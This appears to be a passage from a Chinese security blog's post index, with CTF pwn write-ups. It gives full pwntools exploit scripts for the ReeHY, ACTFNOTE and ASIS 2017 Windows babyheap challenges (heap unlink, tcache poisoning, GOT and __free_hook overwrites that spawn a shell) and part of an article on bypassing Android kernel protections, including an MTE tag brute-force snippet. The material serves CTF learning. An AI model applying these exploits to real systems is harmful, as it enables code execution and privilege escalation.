create(0x100,0,&#x27;a&#x27;*0x100)  create(0x100,1,&#x27;b&#x27;*0x100)    #delete功能没有检查下标越界,delete(-2)就是释放记录4个cun大小的那个堆空间  delete(-2)    payload = p32(0x200) + p32(0x100)  #根据堆fastbin的特性，新申请的空间位于刚刚释放的那个小内存处,将覆盖原来的那个内容，相当于qword_6020C0[0] = 0x200，  #这样功能3 read的时候就可以溢出堆(本来只读取那么多，现在可以多读取0x100字节)  create(0x14,2,payload)    #现在我们要在第一个堆里构造一个假的堆结构了  # prev_size        size 末尾的1标志前一个块不空闲  payload = p64(0) + p64(0x101)  # FD 和 BK分别是后一个块的指针和前一个块的指针,构成双向链表  # if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))  #  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P);  #为了绕过验证，首先  # FD = *(P + size + 0x10)  # BK = *(P - Prev_Size + 0x18)  # FD-&gt;bk = *(P + size + 0x10) - FD-&gt;Prev_Size + 0X18  # BK-&gt;fd = *(P - Prev_Size + 0x18) + BK-&gt;size + 0x10  # 上面即检测双向链表的完整性  # 如果通过  # unlink里的关键代码  #   FD-&gt;bk = BK;  #   BK-&gt;fd = FD;  # 我们现在的目的是，利用这两个指针修改的操作，来修改我们想要的位置  # 这个程序中，在0x6020E0是一个数组，用来保存着4个堆的指针  # 如果我们想办法把这些堆指针改成某些函数的got表地址，那么我们下次read时，数据就会覆盖got表  # 因此,如果 (P + size + 0x10) = 0x6020E0 ，(P - Prev_Size + 0x18) = 0x6020E0  # 即P + size = 0x6020D0，P - Prev_Size = 0x6020C8  # 即BK = 0x6020D0 ，FD = 0x6020C8  # 即P-&gt;fd = 0x6020C8，P-&gt;bk = 0x6020D0  # 现在，主角是P，我们让第一个堆为主角  payload += p64(0x6020C8) + p64(0x6020D0)  #填充满第一个块  payload += &#x27;a&#x27;*(0x100-4*8);  #溢出到第二个块  # prev_size   size  # 对于使用中的块，它的结构是这样的  # prev_size 8 byte  # size 8 byte  #修改第二个块的Prev_Size，造成前一个块被释放的假象  payload += p64(0x100) + p64(0x100 + 2 * 8)  #发送payload，修改堆结构  edit(0,payload)  #现在我们调用delete(1)释放第二个块，它会和我们伪造的块进行unlink合并  #  #   执行  #   FD-&gt;bk = BK;  #   BK-&gt;fd = FD;  #  #   即*(0x6020C8+0x18) = 0x6020D0  #     *(0x6020D0 + 0x10) = 0x6020C8  #   最终即0x6020E0 = 0x6020C8  #  这样，由于0x6020E0处是用于保存第1个堆指针的，现在被我们指向了0x6020C8处，于是我们向第1个堆输入数据都会存于这里  #触发unlink  delete(1)    elf = ELF(&#x27;./4-ReeHY-main&#x27;)  free_got = elf.got[&#x27;free&#x27;]  puts_got = elf.got[&#x27;puts&#x27;]  atoi_got = elf.got[&#x27;atoi&#x27;]  puts_plt = elf.plt[&#x27;puts&#x27;]  #于是，我们可以根据结构，布局payload来覆盖0x6020E04处的几个堆的指针  payload = &#x27;\\x00&#x27;*0x18   #padding  payload += p64(free_got) + p64(1)  payload += p64(puts_got) + p64(1)  payload += p64(atoi_got) + p64(1)    #执行后，前3个堆指针都被我们指向了几个函数的got地址处  edit(0,payload)  #修改free的got地址为puts的plt地址  edit(0,p64(puts_plt))  #即调用puts_plt(puts_got)，泄露puts的加载地址  delete(1)  puts_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))    print hex(puts_addr)  libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)    libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;);  #修改atoi的got地址为system的got地址  edit(2,p64(system_addr))    #get shell  sh.sendlineafter(&#x27;$&#x27;,&#x27;/bin/sh&#x27;)    sh.interactive()  \n\n\n以上解法在libc2.26以前测试成功。然而，我们的目的并不只是为了获得flag。我们要更广泛的学习。在libc2.26及以后，加入了tcache机制，使得上述方案有些改变，但是基本原理还是一样。\n \nLibc2.26即以上的解法Tcache是libc2.26之后引进的一种新机制，类似于fastbin一样的东西，每条链上最多可以有 7 个 chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找\n相比较double free，tcache机制反而使得我们的攻击变得简单\nTcache使用单项链表维护。tache posioning 和 fastbin attack类似，而且限制更加少，不会检查size，直接修改 tcache 中的 fd，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。tcache机制允许，将空闲的chunk以链表的形式缓存在线程各自tcache的bin中。下一次malloc时可以优先在tcache中寻找符合的chunk并提取出来。他缺少充分的安全检查，如果有机会构造内部chunk数据结构的特殊字段，我们可以有机会获得任意想要的地址。\n我们看看tcache关键处的源代码\nstatic __always_inline void *  tcache_get (size_t tc_idx)  &#123;  tcache_entry *e = tcache-&gt;entries[tc_idx];    //idx防止越界    assert (tc_idx &lt; TCACHE_MAX_BINS);    //确实有块    assert (tcache-&gt;entries[tc_idx] &gt; 0);    //取出第一个块    tcache-&gt;entries[tc_idx] = e-&gt;next;    //计数减少    --(tcache-&gt;counts[tc_idx]);    //key设置为null    e-&gt;key = NULL;    //返回chunk    return (void *) e;  &#125;  \n\n其实就是取出单链表头结返回，然后设置新的头结点\n假如我们写了这样的程序\n#include&lt;stdio.h&gt;  #include&lt;malloc.h&gt;  #include&lt;string.h&gt;    int main(int n,char **args) &#123;          char buf0[20] = &quot;hello&quot;;          char *buf1 = (char *)malloc(32);          char *buf2 = (char *)malloc(32);          char *buf3;          char *buf4;          memset(buf1,&#x27;a&#x27;,32);          memset(buf2,&#x27;b&#x27;,32);          free(buf2);            scanf(&quot;%s&quot;,buf1);            buf3 = (char *)malloc(32);          buf4 = (char *)malloc(32);          scanf(&quot;%s&quot;,buf4);            printf(&quot;%s&quot;,buf0);            return 0;  &#125;  \n\nFree buf2后，buf2块被放入tcache,其中，块的fd指向下一个空闲块，这里，我们只释放了一个块，如果我们再释放一个，那么buf2的fd就会指向那个块。当我们重新申请一样大小的堆时，从tcache的头取出一个块返回给用户，然后下一个空闲块成为新的头。假如我们伪造fd指向我们需要修改的地址处，那么我们再次malloc时便可以让堆指针指向那个地址处，于是我们就能修改那个地方的内容了。上述的脚本为\nfrom pwn import *    sh = process(&#x27;./test&#x27;)    #0x7FFFFFFFE560就是我们的目标地址  payload = &#x27;a&#x27;*32 + p64(0) + p64(0x31)  payload += p64(0x7FFFFFFFE560)    sh.sendline(payload)    sh.sendline(&#x27;hello,hacker!\\n&#x27;);    sh.interactive()  \n\n0x7FFFFFFFE560是存放hello字符串的位置，我们通过tcache攻击，修改了该处的内容为hello,hacker!\\n后面都是同样的道理，于是本题，我们的脚本为\n#coding:utf8  #本方案基于tcache机制，适用于libc2.26即更高版本的环境，以下版本不适用  from pwn import *  from LibcSearcher import *    context.log_level = &#x27;debug&#x27;  sh = process(&#x27;./4-ReeHY-main&#x27;)    #sh = remote(&#x27;111.198.29.45&#x27;,33297)    def welcome():     sh.sendlineafter(&#x27;$&#x27;,&#x27;seaase&#x27;)    def create(size,index,content):     sh.sendlineafter(&#x27;$&#x27;,&#x27;1&#x27;)     sh.sendlineafter(&#x27;Input size\\n&#x27;,str(size))     sh.sendlineafter(&#x27;Input cun\\n&#x27;,str(index))     sh.sendafter(&#x27;Input content\\n&#x27;,content)    def delete(index):     sh.sendlineafter(&#x27;$&#x27;,&#x27;2&#x27;)     sh.sendlineafter(&#x27;Chose one to dele\\n&#x27;,str(index))    def edit(index,content):     sh.sendlineafter(&#x27;$&#x27;,&#x27;3&#x27;)     sh.sendlineafter(&#x27;Chose one to edit\\n&#x27;,str(index))     sh.sendafter(&#x27;Input the content\\n&#x27;,content)      welcome()    #开辟两个空间  create(0x40,0,&#x27;a&#x27;*0x40)  create(0x40,1,&#x27;b&#x27;*0x40)  #溢出，释放保存堆大小的数组  delete(-2)  #构造payload修改第二个堆的大小信息，只是信息，堆的大小并没有改变  payload = p32(0x80) + p32(0x40)  create(0x14,2,payload)  #删除第二个堆  delete(1)    #构造payload覆盖第二个堆的fd指针  payload = &#x27;a&#x27; * 0x40  payload += p64(0) + p64(0x51)  #覆盖块2的fd  payload += p64(0x6020e0)  edit(0,payload)  #重新申请回来这个空间  create(0x40,1,&#x27;c&#x27;*0x40)      elf = ELF(&#x27;./4-ReeHY-main&#x27;)  free_got = elf.got[&#x27;free&#x27;]  puts_got = elf.got[&#x27;puts&#x27;]  atoi_got = elf.got[&#x27;atoi&#x27;]  puts_plt = elf.plt[&#x27;puts&#x27;]    payload = p64(free_got) + p64(1)  payload += p64(puts_got) + p64(1)  payload += p64(atoi_got) + p64(1)  #接下来，我们申请的堆指针指向0x6020e0  #那么我们可以为所欲为了  #覆盖数组里的前三个堆指针分别为free_got、puts_got、atoi_got的地址  #于是，堆指针0指向free,堆指针1指向puts，堆指针2指向atoi  create(0x40,3,payload)  #修改free的got地址为puts的plt地址  edit(0,p64(puts_plt))  #相当于puts(puts_got)  #泄露puts地址  delete(1)  #获取puts的加载地址  puts_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))  #LibcSearcher搜索数据库，查询libc版本  libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)    libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)  #获取system的地址  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  #修改atoi的got地址为system的地址  edit(2,p64(system_addr))  #getshell  sh.sendlineafter(&#x27;$&#x27;,&#x27;/bin/sh&#x27;)    sh.interactive()\n\n","categories":["CTF"],"tags":["double free","unlink","tcache","unsorted bin","glibc <= 2.26","glibc >= 2.26"]},{"title":"ACTF_2019_ACTFNOTE(top chunk上移)","url":"/2020/07/01/ACTF_2019_ACTFNOTE/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，edit里存在溢出，可以直接修改top chunk的size\n\n\n那么只需要把top chunk的size修改为-1，然后malloc(负数)即可将TOP chunk向前移动与已有的chunk重叠，然后通过申请空间，控制该程序结构体的指针即可实现任意地址读写。\n#coding:utf8from pwn import *#sh = process(&#x27;./ACTF_2019_ACTFNOTE&#x27;)sh = remote(&#x27;node3.buuoj.cn&#x27;,29877)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)def add(size,name,content):   sh.sendlineafter(&#x27;$&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;size:&#x27;,str(size))   sh.sendafter(&#x27;name:&#x27;,name)   sh.sendafter(&#x27;content:&#x27;,content)def edit(index,content):   sh.sendlineafter(&#x27;$&#x27;,&#x27;2&#x27;)   sh.sendlineafter(&#x27;id:&#x27;,str(index))   sh.sendafter(&#x27;content:&#x27;,content)def delete(index):   sh.sendlineafter(&#x27;$&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;id:&#x27;,str(index))def show(index):   sh.sendlineafter(&#x27;$&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;id:&#x27;,str(index))add(0x10,&#x27;a\\n&#x27;,&#x27;b&#x27;*0x18) #0add(0x10,&#x27;a\\n&#x27;,&#x27;/bin/sh\\x00&#x27;) #1show(0)sh.recvuntil(&#x27;b&#x27;*0x18)libc_base = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;)) - 0x8e3f2system_addr = libc_base + libc.sym[&#x27;system&#x27;]free_hook_addr = libc_base + libc.sym[&#x27;__free_hook&#x27;]binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)add(0x10,&#x27;a\\n&#x27;,&#x27;b\\n&#x27;) #2edit(2,&#x27;b&#x27;*0x10 + p64(0) + &#x27;\\xff&#x27;*0x8) #修改top chunk#top chunk上移形成overlap chunkadd(-0x80,p64(free_hook_addr),&#x27;&#x27;) #3#修改free_hookedit(2,p64(system_addr))#getshelldelete(1)sh.interactive()","categories":["CTF"],"tags":["堆溢出","top chunk"]},{"title":"ASIS_2017_Babyheap_Windows_unlink","url":"/2020/07/26/ASIS_2017_Babyheap_Windows_unlink/","content":"用IDA分析一下，在edit功能里，没有检查length，可以直接溢出\n\n\n由于是在windows server 2016上，所以堆header有加密，通过伪造header里的flag状态为0，然后设置好fd、bk，unlink即可。经过测试，在这个版本的windows上，可以直接unlink，只需要注意，在windows里fd和bk指向的是堆的content出，而不是header处。\n#coding:utf8from pwn import *#sh = remote(&#x27;192.168.232.137&#x27;,6666)context.log_level = &#x27;debug&#x27;sh = remote(&#x27;node3.buuoj.cn&#x27;,26285)sh.recvuntil(&#x27;gift : &#x27;)exe_base = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16) - 0x1090print &#x27;exe_base=&#x27;,hex(exe_base)def add(size,content):   sh.sendlineafter(&quot;What&#x27;s your choice?&quot;,&quot;1&quot;)   sh.sendlineafter(&#x27;sword?&#x27;,str(size))   sh.sendlineafter(&#x27;it!&#x27;,content)def delete(index):   sh.sendlineafter(&quot;What&#x27;s your choice?&quot;,&quot;2&quot;)   sh.sendlineafter(&#x27;destroy?&#x27;,str(index))def edit(index,size,content):   sh.sendlineafter(&quot;What&#x27;s your choice?&quot;,&quot;3&quot;)   sh.sendlineafter(&#x27;polish?&#x27;,str(index))   sh.sendlineafter(&#x27;time?&#x27;,str(size))   sh.sendlineafter(&#x27;again :&#x27;,content)def show(index):   sh.sendlineafter(&quot;What&#x27;s your choice?&quot;,&quot;4&quot;)   sh.sendlineafter(&#x27;check?&#x27;,str(index))def backdoor(addr):   sh.sendlineafter(&quot;What&#x27;s your choice?&quot;,&quot;1337&quot;)   sh.sendlineafter(&#x27;target?&#x27;,str(addr))add(0x10,&#x27;a&#x27;*0x10) #0add(0x18,&#x27;b&#x27;*0x18) #1add(0x80,&#x27;c&#x27;*0x80) #2add(0x10,&#x27;d&#x27;*0x10) #3add(0x10,&#x27;e&#x27;*0x10) #4#泄露堆头show(1)sh.recvuntil(&#x27;b&#x27;*0x18)header_data = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))print &#x27;header_data=&#x27;,hex(header_data)#计算出用于加密的maskfirst_4_mask = (header_data &amp; 0xFFFFFFFF) ^ 0x10010011prev_size_mask = ((header_data &gt;&gt; 32) &amp; 0xFFFF) ^ 0x4print &#x27;first_4_mask=&#x27;,hex(first_4_mask)print &#x27;prev_size_mask=&#x27;,hex(prev_size_mask)#伪造1的headersize = 0x4flag = 0 #当前chunk的空闲状态#计算校验字节smallTagIndex = flag ^ sizefake_header1 = (smallTagIndex &lt;&lt; 24) + (flag &lt;&lt; 16) + size#加密headerfake_header1 = fake_header1 ^ first_4_maskprev_size = 0x3#加密prev_sizeprev_size ^= prev_size_maskfake_header1 = (0x8 &lt;&lt; 56) + (prev_size &lt;&lt; 32) + fake_header1print &#x27;fake_header1=&#x27;,hex(fake_header1)#伪造2的headersize = 0x11flag = 1 #当前chunk的空闲状态#计算校验字节smallTagIndex = flag ^ sizefake_header2 = (smallTagIndex &lt;&lt; 24) + (flag &lt;&lt; 16) + size#加密headerfake_header2 = fake_header2 ^ first_4_maskprev_size = 0x4#加密prev_sizeprev_size ^= prev_size_maskfake_header2 = (0x8 &lt;&lt; 56) + (prev_size &lt;&lt; 32) + fake_header2print &#x27;fake_header2=&#x27;,hex(fake_header2)#溢出，修改1、2的header，同时1中伪造好fd和bkheap1_ptr_addr = exe_base + 0x4374print &#x27;heap1_ptr_addr=&#x27;,hex(heap1_ptr_addr)edit(0,0x38,&#x27;a&#x27;*0x10 + p64(fake_header1) + p32(heap1_ptr_addr - 0x4) + p32(heap1_ptr_addr) + &#x27;b&#x27;*0x10 + p64(fake_header2))#unlinkdelete(2)puts_iat = exe_base + 0x30c8HeapAlloc_iat = exe_base + 0x300Cedit(1,0x10,p32(puts_iat) + p32(0) + p32(HeapAlloc_iat) + p32(heap1_ptr_addr))#泄露puts地址show(1)sh.recvuntil(&#x27;Show : &#x27;)puts_addr = u32(sh.recv(4))ucrtbase = puts_addr - 0x95a30system_addr = ucrtbase + 0xb8320print &#x27;system_addr=&#x27;,hex(system_addr)#泄露ntdll地址show(3)sh.recvuntil(&#x27;Show : &#x27;)HeapAlloc_addr = u32(sh.recv(4))ntdll_base = HeapAlloc_addr - 0x40120#得到peb指针的地址Peb_ptr_addr = ntdll_base + 0x10ebacprint &#x27;ntdll_base=&#x27;,hex(ntdll_base)print &#x27;Peb_ptr_addr=&#x27;,hex(Peb_ptr_addr)edit(4,0x4,p32(Peb_ptr_addr))#泄露peb的地址show(1)sh.recvuntil(&#x27;Show : &#x27;)peb_base = u32(sh.recvuntil(&#x27;\\r&#x27;,drop = True).ljust(4,&#x27;\\x00&#x27;)) - 0x21cstack_ptr_addr = peb_base + 0x3000print &#x27;peb_base=&#x27;,hex(peb_base)print &#x27;stack_ptr_addr=&#x27;,hex(stack_ptr_addr)edit(4,0x4,p32(stack_ptr_addr))#泄露栈地址show(1)sh.recvuntil(&#x27;Show : &#x27;)stack_addr = u32(sh.recvuntil(&#x27;\\r&#x27;,drop = True).ljust(4,&#x27;\\x00&#x27;))rop_addr = stack_addr + 0xc0print &#x27;rop_addr=&#x27;,hex(rop_addr)edit(4,0xC,p32(rop_addr) + &#x27;cmd.exe\\x00&#x27;)#写roprop = p32(system_addr) + p32(0) + p32(heap1_ptr_addr + 0x4)edit(1,0xC,rop)#getshellsh.sendlineafter(&quot;What&#x27;s your choice?&quot;,&quot;5&quot;)sh.interactive()","categories":["CTF"],"tags":["unlink","堆溢出","windows漏洞利用"]},{"title":"Android保护机制及内核漏洞利用总结","url":"/2024/12/12/Android%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/","content":"前言本文总结了在Android上利用漏洞时遇到的一些新的保护机制以及在真机上的内核漏洞利用和调试技巧。虽然Android底层为Linux内核，但是相比较下Android内核更加难利用，主要体现在真机不能实时调试，可能开启了BTI保护、PAC保护和CFI保护，同时在近年新出的一些手机如Pixel 10开启了内存标记访问保护Memory Tagging Extension(MTE)，本文还将介绍MTE保护在用户态时的一个特殊的绕过方法。\n真机内核利用适配对于一个真机内核，在编写漏洞利用程序期间可以编译一个版本一样的Linux内核用qemu模拟运行，便于掌握数据的处理过程。还可以使用Android模拟器，目前高版本的Android模拟器无法在x86&#x2F;x64架构下模拟AARCH64的镜像，可以在AARCH64架构下的主机，如树莓派等下面运行模拟器。在模拟的内核中利用成功后，就是如何将其移植到真机上的问题。虽然真机不能实时调试，但是可以通过查看/sys/fs/pstore/目录下的日志文件以及dmesg来获取内核最后崩溃时的寄存器值。根据寄存器信息来定位漏洞利用程序中需要适配的位置。\nroot@apalis-imx8:~$ cat /sys/fs/pstore/dmesg-ramoops-0Panic#1 Part1&lt;6&gt;[    0.000000] Booting Linux on physical CPU 0x0000000000 [0x410fd034]&lt;5&gt;[    0.000000] Linux version 5.4.77-5.1.0-devel+git.a2f08dfd79ae (eichest@eichest-laptop) (gcc version 10.2.0 (Ubuntu 10.2.0-8ubuntu1)) #19 SMP PREEMPT Tue Apr 6 17:18:18 CEST 2021&lt;6&gt;[    0.000000] Machine model: Toradex Apalis iMX8QM V1.1 on Apalis Evaluation Board...&lt;6&gt;[   64.111102] sysrq: Trigger a crash&lt;0&gt;[   64.114539] Kernel panic - not syncing: sysrq triggered crash&lt;4&gt;[   64.120303] CPU: 1 PID: 705 Comm: sh Tainted: G           O      5.4.77-5.1.0-devel+git.a2f08dfd79ae #19&lt;4&gt;[   64.129797] Hardware name: Toradex Apalis iMX8QM V1.1 on Apalis Evaluation Board (DT)&lt;4&gt;[   64.137635] Call trace:&lt;4&gt;[   64.140095]  dump_backtrace+0x0/0x140&lt;4&gt;[   64.143772]  show_stack+0x14/0x20&lt;4&gt;[   64.147099]  dump_stack+0xb4/0x11c&lt;4&gt;[   64.150513]  panic+0x15c/0x328&lt;4&gt;[   64.153582]  sysrq_handle_crash+0x18/0x20&lt;4&gt;[   64.157600]  __handle_sysrq+0x88/0x180&lt;4&gt;[   64.161361]  write_sysrq_trigger+0x8c/0xb0&lt;4&gt;[   64.165473]  proc_reg_write+0x6c/0xbc&lt;4&gt;[   64.169148]  __vfs_write+0x18/0x40&lt;4&gt;[   64.172557]  vfs_write+0xdc/0x1c4&lt;4&gt;[   64.175879]  ksys_write+0x68/0xfc&lt;4&gt;[   64.179204]  __arm64_sys_write+0x18/0x20&lt;4&gt;[   64.183137]  el0_svc_common.constprop.0+0x68/0x160&lt;4&gt;[   64.187936]  el0_svc_handler+0x20/0x80&lt;4&gt;[   64.191698]  el0_svc+0x8/0x208&lt;2&gt;[   64.194768] SMP: stopping secondary CPUs&lt;0&gt;[   64.198703] Kernel Offset: disabled&lt;0&gt;[   64.202199] CPU features: 0x0002,2100600c&lt;0&gt;[   64.206209] Memory Limit: none\n\nSELinuxSELinux是一个强制访问控制安全机制，它提供了一种灵活的、细粒度的访问控制策略，用于提高Linux系统的安全性。Android上默认开启了SeLinux，因此某些漏洞利用方法在编译的Linux内核中能够使用但是在Android上测试却失效了。\nSELinux原理SELinux实际上是对系统中所有的关键函数注册了HOOK\n\n这些HOOK函数会在函数中被调用，它们一般以security_开头。\n\n如果SELinux没有开启，这些security_函数默认返回0让程序继续程序，如果开启了则跳转到HOOK函数执行。\n\n这些HOOK函数根据SELinux配置的规则对参数进行审计，以此来让一个函数执行或者拒绝。\nSELinux绕过当开启SELinux时，改写modprobe_path或者core_pattern后不能触发提权脚本的执行，这是因为我们指向的脚本不在SELinux规则中规定的可执行路径。为了绕过SELinux的检查，我们查看审计函数的代码，avc_has_perm函数的子调用链为avc_has_perm-&gt;avc_has_perm_noaudit\n\n如果avc_has_perm_noaudit函数审计出当前的操作是被禁止的，那么调用avc_denied函数。\n\n从avc_denied函数来看，如果selinux_enforcing全局变量为0，则仍然可以使得avc_denied返回0，进而让selinux_函数放行，因此可以利用漏洞改写selinux_enforcing这个全局变量来绕过SELinux。\n在高版本Linux中，判断方式采用了函数，实际上判断的是state-&gt;enforce\n\n而state指针指向的仍然是一个全局变量结构体。\n\n因此可以修改selinux_state.enforce变量。\nCFI保护CFI保护是Android内核中引入的，目的是保护函数指针，如果函数指针被篡改为任意地址，会被检测出来然后终止执行。开启了CFI保护的内核如下所示，会有很多以.cfi结尾的函数\n\n还存在着不带.cfi结尾的同名函数\n\n不带.cfi的函数中只会有一条B跳转指令，不会再有其他任何人指令。实际上这些函数是一张类似于PLT跳转表的东西，我们可以把它命名为CFI表。\n函数指针检查CFI的检测实际上就是对每一个函数指针调用的位置进行了插桩，判断函数指针是否在CFI表中，如下是CFI的桩代码\n\n如果函数指针发生了篡改，则将进入_cfi_slowpath函数，_cfi_slowpath函数调用_cfi_check进行检查\n\n_cfi_check根据_cfi_slowpath函数的第一个参数传入的MAGIC值，会再一次的判断函数指针是否能够通过检查。\n\n如果函数指针与预期值不等，则调用__cfi_check_fail函数让内核崩溃。\n\n\n函数指针多值的处理某些函数指针可能有多个指向的目标，因此不能对函数指针进行固定值比较，CFI采用了运算的方式将指针值限定在一个范围内\n\n即只能在CFI表中的single_step_handler附近\n\n显然，在编译时，生成的这张CFI表中函数的排列顺序是精心计算安排的，把一个函数指针所有可能的指向地址排列成相邻的。\nCFI绕过的可能思路对于ARM架构，目前无法绕过CFI，因为ARM架构的指令是对齐且定长的，不能在CFI表中跳转到错位的地址进而构造出ROP gadget。如果是在x86架构下，对于函数指针多值的CFI检查，由于指针值限定在CFI表的一个范围区间，可以在区间内寻找是否有合适的gadget能够控制执行流。\nCFI例题在GeekCon的ksocket pixel3题目中，实现了一个自定义的socket，我们可以通过UAF控制这个socket对象的结构。由于开启了CFI，我们不能去控制函数指针\n\n我们观察到，在close时触发的avss_release函数中有以下的链表unlink操作\n\n我们可以把unlink用来做任意地址写，由于两个数据都必须为合法的内存指针，因此不能直接写数据。但是可以用错位的思路，CPU为小端，因此指针的最低一个字节存放在最前面，我们每次只需要保证指针的最低一个字节被写入到目标地址即可。令*(v3 + 112) &#x3D; addr,*(v3 + 104) &#x3D; bss | byte，则可以在addr处写上一个字节byte。其中bss为bss的地址，用于保证两个数据都为合法的内存指针不会崩溃。在实现了任意地址写以后，改写selinux_enforcing为0关闭selinux，改写modprobe_path为提权脚本。然后触发modprobe_path的执行。\nBTI保护在 AArch64（ARMv8-A 架构的 64 位模式）中，BTI 指令用于验证间接跳转的目标是否有效。它的主要作用是确保程序控制流只能跳转到预期的代码位置（即合法的分支目标）。即BLR/BR Rn寄存器跳转指令跳转的目标位置的第一条指令必须为BTI否则函数无法继续向下执行。\n\n\nPAC保护PAC原理PAC（Pointer Authentication） 技术，用于验证和保护返回地址及其他指针数据的完整性。ARMv8.3-A 新引入了三类指令：\n\nPAC* 类指令可以向指针中生成和插入 PAC。比如，PACIA X8，X9 可以在寄存器X8中以 X9 为上下文，APIAKey为密钥，为指针计算PAC，并且将结果写回到 X8 中。\nAUT* 类指令可以验证一个指针的 PAC。如果PAC是合法的，将会还原原始的指针。否则，将会在指针的扩展位中将会被写入错误码，在指针被简接引用时，会触发错误。比如，AUTIA X8,X9 可以以 X9 为上下文，验证 X8 寄存器中的指针。当验证成功时会将指针写回 X8，失败时则写回一个错误码。\nXPAC* 类指令可以移除一个指针的 PAC 并且在不验证指针有效性的前提下恢复指针的原始值。PAC的加密生成算法不同的硬件有不同的实现。\n\n在Android中，开启了PAC保护的函数如图所示，PACIASP指令会基于当前的栈指针（SP）、私有密钥（APIAKey）以及返回地址生成认证码,认证码被嵌入到给定的函数返回地址中,在函数返回时，使用对应的 AUTIASP 指令对返回地址进行验证。如果地址合法且未被篡改，验证成功；否则，程序会触发异常（SIGILL 或其他非法指令异常）。\n\n\nPAC绕过PAC绕过是困难的，PAC的密钥通过特定的系统寄存器存储和操作。内核态使用的密钥是APIXKey_EL1，用户态使用的密钥是APIXKey_EL0，因此在用户态计算出的PAC值不能给内核态使用。内核态下可以操作访问APIXKey_EL1、APIXKey_EL0等寄存器修改或者读取密钥\n\n因此有一种可能的情形就是在内核态中某个gadget可以将用户态的APIXKey_EL0修改成与内核态一样的数值，那么就可以在用户态执行PAC指令计算PAC值然后填入ROP链。\nMTE保护MTE原理MTE (Memory Tagging Extension)是ARMv8.5-A 架构引入的一项硬件支持的内存安全技术，旨在检测和防止内存相关的错误和漏洞，例如越界访问和使用已释放内存（Use-After-Free, UAF）。MTE 的基本原理\nIRG &lt;Xd&gt;, &lt;Xn&gt;, &lt;Xm&gt;stg  Xd, [Xn]ldr  Xd, [Xn]\n\nIRG (Insert Random Tag) 指令为指针Xn生成一个随机tag，使用Xm作为种子，将结果保存至Xd中。\nSTG (Store Allocation Tag) 指令将tag应用至内存中，生效的长度取决于颗粒度，一般为16字节。\nLDR (Load Register) 使用带有tag的指针读取内存。\n\n\n如图，IRG指令执行后，X0比X8在高位多了一个TAG值。\n\nSTG指令执行后，以后访问这段内存需要带上正确的TAG值的指针才能访问，否则指令会执行错误。\n\n\nMTE应用在堆分配器中，malloc后，通过对申请的堆地址打上标签返回，free后对堆地址重新打标签。这样就能阻止UAF这类的漏洞，因为free后指针重新打了标签，导致UAF残留的指针无效，通过UAF的指针访问内存时就会崩溃。不同的堆分配器在malloc和free时有着不同的处理内存标签的方式。有关内存分配器处理MTE标签的分析可以参考文章GeekCon的文章填补盾牌的裂缝：堆分配器中的MTE。\nMTE爆破如果给系统调用直接传一个带有错误TAG的指针，会发生什么？如图，假设buf指向的内存已经被free导致重新打标签，现在传给Sys_write的是一个无效的指针\n\n单步进入会触发内核的Error EL1h\n\n错误会被el0t_64_sync函数捕捉处理\n\n异常处理会调用el0_svc函数，并不会退出程序\n\n异常处理完成后，调用ret_to_user返回到了用户态\n\n可见，当一个不正确的MTE指针进入系统调用，系统调用执行不成功，同时进程不会崩溃；我们可以利用这种特性来对TAG值进行爆破。一般的，我们在用户态利用UAF漏洞时，在已知指针值但是不知道TAG，我们可以用这样的方法爆破\n#我们想泄漏leak_ptr_addr地址处的数据，但是这段内存的TAG不知道是多少？#guess tagfor i in range(0x10):   #fake 31 Node struct   edit(0,b&#x27;a&#x27;*0x8 + p32(0x8) + p32(0) + p64((i &lt;&lt; 56) + leak_ptr_addr) + b&#x27;\\n&#x27;)   show(31) #调用Sys_write   sh.recv(1)   leak_value = u64(sh.recv(8)) #如果Sys_write调用成功，会有预期的数据   if leak_value &amp; 0xFF == 0xdc: #判断是否有预期的数据      print(&#x27;found TAG=&#x27;,hex(i))      break\n上述代码来源于我在GeekCon Shanghai 2024上解出的MTE题的EXP。\nAARCH64 JOP在AARCH64中，RET指令不会从栈里弹出返回地址进行返回，RET指令直接跳转到X30寄存器指向的地址；而BLR指令在跳入新函数时，会将返回地址赋值给X30寄存器。由于这个特性，我们在搜索一些gadgets指令时，无需考虑BLR后面的代码，\n在做GeekCon的kSysRace赛题时，我们控制了一个地方的函数指针，能够调用任意一个函数，以及X0执行的内容可控\n.text:FFFFFF80080DB354                 LDR             X8, [X19,#0x98].text:FFFFFF80080DB358                 LDR             X25, [X19,#0xB8].text:FFFFFF80080DB35C                 MOV             X23, X0.text:FFFFFF80080DB360                 MOV             X0, X19.text:FFFFFF80080DB364                 BLR             X8...........................text:FFFFFF80080DB420 loc_FFFFFF80080DB420                    ; CODE XREF: handle_128+118↑j.text:FFFFFF80080DB420                 LDP             X29, X30, [SP,#0x40+var_s0].text:FFFFFF80080DB424                 LDP             X20, X19, [SP,#0x40+var_10].text:FFFFFF80080DB428                 LDP             X22, X21, [SP,#0x40+var_20].text:FFFFFF80080DB42C                 LDP             X24, X23, [SP,#0x40+var_30].text:FFFFFF80080DB430                 LDR             X25, 